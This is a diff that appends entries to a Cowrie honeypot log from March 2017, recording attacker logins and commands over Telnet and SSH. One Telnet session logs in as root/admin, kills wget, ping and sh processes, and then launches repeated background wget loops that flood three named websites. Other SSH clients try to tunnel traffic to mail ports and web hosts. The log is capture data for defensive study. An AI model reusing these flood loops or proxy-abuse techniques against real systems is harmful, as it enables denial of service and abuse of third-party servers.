@@ -2100,3 +2100,117 @@
 2017-03-26T06:17:42+0000 [CowrieTelnetTransport,128732,122.150.58.158] CMD: /bin/busybox FJNHL
 2017-03-26T06:17:42+0000 [CowrieTelnetTransport,128732,122.150.58.158] Command found: /bin/busybox FJNHL
 2017-03-26T06:17:52+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 93.174.95.38:56166 (10.8.41.81:2223) [session: TT128733]
+2017-03-26T06:18:13+0000 [CowrieTelnetTransport,128733,93.174.95.38] login attempt: 1122
+2017-03-26T06:18:13+0000 [CowrieTelnetTransport,128733,93.174.95.38] login return, expect: [root/admin]
+2017-03-26T06:18:15+0000 [CowrieTelnetTransport,128733,93.174.95.38] login attempt [root/admin] succeeded
+2017-03-26T06:18:16+0000 [CowrieTelnetTransport,128733,93.174.95.38] Opening TTY Log: log/tty/20170326-061816-None-128733i.log
+2017-03-26T06:18:16+0000 [CowrieTelnetTransport,128733,93.174.95.38] Warning: state changed and new state returned
+2017-03-26T06:18:16+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 5.199.142.82:41387 (10.8.41.81:2222) [session: f4553aa8]
+2017-03-26T06:18:16+0000 [HoneyPotSSHTransport,50851,5.199.142.82] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-03-26T06:18:16+0000 [HoneyPotSSHTransport,50851,5.199.142.82] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-26T06:18:16+0000 [HoneyPotSSHTransport,50851,5.199.142.82] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-26T06:18:16+0000 [HoneyPotSSHTransport,50851,5.199.142.82] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-26T06:18:22+0000 [HoneyPotSSHTransport,50851,5.199.142.82] NEW KEYS
+2017-03-26T06:18:22+0000 [HoneyPotSSHTransport,50851,5.199.142.82] starting service 'ssh-userauth'
+2017-03-26T06:18:22+0000 [HoneyPotSSHTransport,50851,5.199.142.82] connection lost
+2017-03-26T06:18:22+0000 [HoneyPotSSHTransport,50851,5.199.142.82] Connection lost after 5 seconds
+2017-03-26T06:18:22+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: shell
+2017-03-26T06:18:22+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: shell
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: enable
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: enable 
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: system
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: system
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh 
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: run
+2017-03-26T06:18:23+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: run
+2017-03-26T06:18:33+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: killall wget; killall ping; killall sh
+2017-03-26T06:18:33+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: killall wget
+2017-03-26T06:18:33+0000 [CowrieTelnetTransport,128733,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-26T06:18:33+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: killall ping
+2017-03-26T06:18:33+0000 [CowrieTelnetTransport,128733,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-26T06:18:33+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: killall sh
+2017-03-26T06:18:33+0000 [CowrieTelnetTransport,128733,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-26T06:18:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-26T06:18:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] direct-tcp connection request to 136.243.80.213:80 from localhost:5556
+2017-03-26T06:18:42+0000 [SSHChannel None (506) on SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] direct-tcp forward to 136.243.80.213:80 with data 'GET /internals/api/ip?1490509104182593201 HTTP/1.1\r\nHost: ip.adspy.mobi\r\nConnection: close\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.67 Safari/537.36\r\nAccept-Encoding: gzip\r\n\r\n'
+2017-03-26T06:18:42+0000 [SSHChannel None (506) on SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] failed to connect: Connection refused
+2017-03-26T06:18:42+0000 [SSHChannel None (506) on SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] sending close 506
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: shell
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: shell
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: enable
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: enable 
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: system
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: system
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh 
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: run
+2017-03-26T06:18:43+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: run
+2017-03-26T06:18:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-26T06:18:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] direct-tcp connection request to 23.229.196.128:25 from localhost:5556
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://certifieddatarecovery.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://m.lisk.io:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-26T06:18:53+0000 [CowrieTelnetTransport,128733,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.rscrevolution.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-26T06:18:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,50785,194.88.106.186] got channel 'direct-tcpip' request
+2017-03-26T06:18:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,50785,194.88.106.186] direct-tcp connection request to 23.62.132.223:443 from localhost:5556
+2017-03-26T06:18:58+0000 [SSHChannel None (47) on SSHService 'ssh-connection' on HoneyPotSSHTransport,50785,194.88.106.186] direct-tcp forward to 23.62.132.223:443 with data '\x16\x03\x01\x00\x9d\x01\x00\x00\x99\x03\x01X\xd7]@\xf8\x11\t\x0e\x04\xcc\x91\x7f\x9a_\xe7\xef\x89\xd8P?\x13\x0f\xed/\xc5\xb3_L!\x1e\xa5\r \x9d\x94\xfcP\xdec\x9b*\t\x08\x85\xca\x00K\xc5sks\x89/\x07\xf2\x86}\xac/u\xadt\xbd\xd4\x95\x00\x18\x00/\x005\x00\x05\x00\n\xc0\x13\xc0\x14\xc0\t\xc0\n\x002\x008\x00\x13\x00\x04\x01\x00\x008\xff\x01\x00\x01\x00\x00\x00\x00\x1f\x00\x1d\x00\x00\x1aauth.np.ac.playstation.net\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00'
+2017-03-26T06:18:58+0000 [SSHChannel None (47) on SSHService 'ssh-connection' on HoneyPotSSHTransport,50785,194.88.106.186] failed to connect: Connection refused
+2017-03-26T06:18:58+0000 [SSHChannel None (47) on SSHService 'ssh-connection' on HoneyPotSSHTransport,50785,194.88.106.186] sending close 47
+2017-03-26T06:18:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-26T06:18:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,50808,194.88.106.181] direct-tcp connection request to 144.160.235.144:25 from localhost:5556
+2017-03-26T06:18:59+0000 [HoneyPotSSHTransport,50842,179.43.134.101] avatar admin logging out
+2017-03-26T06:18:59+0000 [HoneyPotSSHTransport,50842,179.43.134.101] connection lost
+2017-03-26T06:18:59+0000 [HoneyPotSSHTransport,50842,179.43.134.101] Connection lost after 914 seconds
